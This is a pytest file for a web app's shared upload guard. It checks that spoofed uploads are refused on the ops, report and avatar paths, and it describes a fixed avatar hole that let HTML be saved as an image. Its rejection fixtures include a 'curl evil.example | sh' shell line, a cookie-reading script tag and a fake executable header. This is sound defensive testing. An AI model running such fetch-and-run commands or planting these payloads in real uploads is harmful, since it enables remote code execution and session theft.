"""The upload guard is shared, so a spoof is refused on every path.

`ops` evidence and dynamic-report attachments used to carry two copies of the
allow-list rule. The third path - the profile avatar - trusted the client's
Content-Type with no byte check at all and stored the extension the user chose,
so `avatar.html` declared as `image/jpeg` was written into the web-served
static/uploads/avatars/ directory as `.html`. All three now go through
`app.services.mime_guard.validate_upload`.
"""
import io
import os

import pytest

from app.services import mime_guard
from tests.conftest import login_as


def _source(path):
    """The text of a module, given a path relative to the repo root."""
    if not os.path.isabs(path):
        path = os.path.join(os.path.dirname(os.path.dirname(
            os.path.abspath(__file__))), path)
    with io.open(path, encoding="utf-8") as handle:
        return handle.read()


JPEG = b"\xff\xd8\xff\xe0" + b"\x00" * 32
PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
GIF = b"GIF89a" + b"\x00" * 32
WEBP = b"RIFF\x00\x00\x00\x00WEBP" + b"\x00" * 32
PDF = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3" + b"\x00" * 32

EXE = b"MZ\x90\x00\x03\x00\x00\x00this program cannot be run in DOS mode"
SCRIPT = b"#!/bin/sh\ncurl evil.example | sh"
HTML = b"<html><script>alert(document.cookie)</script></html>"


class TestSniffMime:

    @pytest.mark.parametrize("payload,mime", [
        (JPEG, "image/jpeg"),
        (PNG, "image/png"),
        (GIF, "image/gif"),
        (WEBP, "image/webp"),
        (PDF, "application/pdf"),
    ])
    def test_genuine_payloads_are_accepted(self, payload, mime):
        assert mime_guard.sniff_mime(payload, mime) == mime

    @pytest.mark.parametrize("payload,mime", [
        (EXE, "image/jpeg"),
        (EXE, "image/png"),
        (SCRIPT, "image/png"),
        (HTML, "image/jpeg"),
        (HTML, "image/gif"),
        (b"RIFF\x00\x00\x00\x00WAVEfmt ", "image/webp"),
        (b"", "image/png"),
        (b"just text", "application/pdf"),
    ])
    def test_spoofed_payloads_are_rejected(self, payload, mime):
        assert mime_guard.sniff_mime(payload, mime) is None

    def test_declared_type_must_match_the_bytes(self):
        assert mime_guard.sniff_mime(PNG, "application/pdf") is None
        assert mime_guard.sniff_mime(PDF, "image/png") is None
        assert mime_guard.sniff_mime(GIF, "image/jpeg") is None

    def test_uppercase_declared_type_is_normalised(self):
        assert mime_guard.sniff_mime(PNG, "IMAGE/PNG") == "image/png"

    def test_webp_requires_the_fourcc(self):
        assert mime_guard.sniff_mime(b"RIFF" + b"\x00" * 8, "image/webp") is None
        assert mime_guard.sniff_mime(WEBP, "image/webp") == "image/webp"


class TestDeclaredMime:

    @pytest.mark.parametrize("name,mime", [
        ("a.jpg", "image/jpeg"), ("a.JPEG", "image/jpeg"),
        ("a.png", "image/png"), ("a.gif", "image/gif"),
        ("a.webp", "image/webp"), ("a.pdf", "application/pdf"),
        ("dir/sub/a.png", "image/png"),
    ])
    def test_known_extensions(self, name, mime):
        assert mime_guard.declared_mime(name) == mime

    @pytest.mark.parametrize("name", ["a.exe", "a.txt", "noext", "", "a."])
    def test_unknown_extensions_are_none(self, name):
        assert mime_guard.declared_mime(name) is None


class TestIsAllowedUpload:

    @pytest.mark.parametrize("payload,name,mime", [
        (JPEG, "x.jpg", "image/jpeg"),
        (PNG, "x.png", "image/png"),
        (WEBP, "x.webp", "image/webp"),
    ])
    def test_extension_type_and_bytes_must_all_agree(self, payload, name,
                                                     mime):
        assert mime_guard.is_allowed_upload(payload, name, mime) is True

    def test_extension_disagreement_is_refused(self):
        assert mime_guard.is_allowed_upload(PNG, "x.gif", "image/gif") is False

    def test_unknown_extension_is_refused(self):
        assert mime_guard.is_allowed_upload(PNG, "x.exe", "image/png") is False

    def test_missing_declared_type_falls_back_to_the_extension(self):
        assert mime_guard.is_allowed_upload(PNG, "x.png", "") is True

    def test_exe_named_as_jpeg_is_refused(self):
        assert mime_guard.is_allowed_upload(EXE, "x.jpg", "image/jpeg") is False


class TestBothUploadPathsAgree:

    def _rid(self, app, serial="SIR-000001"):
        from app.ops.models import SiteInspection
        with app.app_context():
            return SiteInspection.query.filter_by(serial=serial).one().id

    def test_ops_path_refuses_a_spoofed_executable(self, app, client):
        login_as(client, "t_eng")
        r = client.post(f"/ops/site-inspections/{self._rid(app)}/attachments",
                        data={"file": (io.BytesIO(EXE), "totally-a-photo.jpg")})
        assert r.status_code == 415
        assert "does not match" in r.get_json()["error"]

    def test_dynamic_path_refuses_a_spoofed_executable(self, app, client):
        login_as(client, "t_admin")
        r = client.post("/reports/dyn/new/daily", data={
            "project_name": "Spoof Attempt", "report_date": "2026-09-24",
            "f_photos_esha__0__photo": (io.BytesIO(EXE), "photo.png")},
            content_type="multipart/form-data", follow_redirects=True)
        assert r.status_code == 200
        assert "لا يطابق نوعه" in r.get_data(as_text=True)
        from app.models import ReportSubmission
        with app.app_context():
            assert ReportSubmission.query.filter_by(
                project_name="Spoof Attempt").count() == 0

    def test_dynamic_path_still_accepts_a_real_photo(self, app, client):
        login_as(client, "t_admin")
        r = client.post("/reports/dyn/new/daily", data={
            "project_name": "Genuine Photo", "report_date": "2026-09-24",
            "f_photos_esha__0__photo": (io.BytesIO(PNG), "photo.png")},
            content_type="multipart/form-data", follow_redirects=True)
        assert r.status_code == 200
        from app.models import ReportSubmission
        with app.app_context():
            sub = ReportSubmission.query.filter_by(
                project_name="Genuine Photo").one()
            key = sub.data["photos_esha"][0]["photo"]
            assert key.startswith("reports/")

    def test_both_paths_refuse_the_same_payload_identically(self, app, client):
        login_as(client, "t_eng")
        rid = self._rid(app)
        ops = client.post(f"/ops/site-inspections/{rid}/attachments",
                          data={"file": (io.BytesIO(HTML), "x.png")})
        login_as(client, "t_admin")
        dyn = client.post("/reports/dyn/new/daily", data={
            "project_name": "Both Paths", "report_date": "2026-09-24",
            "f_photos_esha__0__photo": (io.BytesIO(HTML), "x.png")},
            content_type="multipart/form-data")
        assert ops.status_code == 415
        assert dyn.status_code in (200, 422)


class TestGuardIsTheSingleSourceOfTruth:

    def test_ops_module_reuses_the_shared_allow_list(self):
        from app.ops import routes
        assert routes.ALLOWED_MIME == set(mime_guard.ALLOWED_MIME)
        assert routes.MAX_UPLOAD_BYTES == mime_guard.MAX_UPLOAD_BYTES

    def test_reports_module_reuses_the_shared_rule(self):
        """Both upload paths must call the one guard, not a copy of it.

        Asserted by what the module actually calls. It used to assert
        ``routes.is_allowed_upload is mime_guard.is_allowed_upload``, which
        only held because reports routes re-exported the name by import - a
        contract on an import rather than on behaviour, and one that a
        module-object import breaks without anything getting weaker.
        """
        from app.reports import routes
        assert routes.mime_guard is mime_guard
        assert "mime_guard.validate_upload" in _source(routes.__file__)
        assert routes.MAX_UPLOAD_DYN == mime_guard.MAX_UPLOAD_BYTES

    def test_the_ops_path_calls_the_shared_guard_too(self):
        from app.ops import routes as ops_routes
        assert ops_routes.mime_guard is mime_guard
        assert "mime_guard.validate_upload" in _source(ops_routes.__file__)

    def test_the_avatar_path_calls_the_shared_guard(self):
        """The path that trusted file.mimetype and skipped the sniff entirely."""
        from app.main import routes as main_routes
        assert "validate_upload" in _source(main_routes.__file__)

    def test_no_path_calls_the_byte_sniffer_directly_any_more(self):
        """One decision, one owner.

        A path calling ``sniff_mime`` on its own is re-implementing part of the
        rule, and that is how the three paths came to disagree about what an
        acceptable upload was.
        """
        for module in ("app/ops/routes.py", "app/reports/routes.py",
                       "app/main/routes.py"):
            source = _source(module)
            assert ".sniff_mime(" not in source, (
                f"{module} sniffs the bytes itself instead of asking the guard")

    def test_every_upload_path_goes_through_the_guard(self):
        for module in ("app/ops/routes.py", "app/reports/routes.py",
                       "app/main/routes.py"):
            assert "validate_upload" in _source(module), (
                f"{module} accepts an upload without the shared guard")

    def test_allow_list_contains_only_real_image_and_pdf_types(self):
        assert mime_guard.ALLOWED_MIME == frozenset({
            "image/jpeg", "image/png", "image/gif", "image/webp",
            "application/pdf"})
        assert not any("text" in m or "octet" in m
                       for m in mime_guard.ALLOWED_MIME)
